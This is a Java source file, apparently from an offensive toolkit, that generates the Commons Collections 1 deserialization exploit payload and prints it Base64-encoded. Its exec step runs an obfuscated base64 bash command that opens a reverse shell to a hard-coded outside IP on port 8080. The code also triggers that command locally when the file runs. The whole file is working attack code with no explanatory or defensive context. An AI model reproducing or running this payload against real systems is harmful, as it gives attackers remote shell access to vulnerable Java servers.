package playloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjEwMS4xNzEuMjAzLzgwODAgMD4mMQ==}|{base64,-d}|{bash,-i}"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(b);
        oos.writeObject(o);
        String payload = Base64.getEncoder().encodeToString(b.toByteArray());
        System.out.println(payload);

    }
}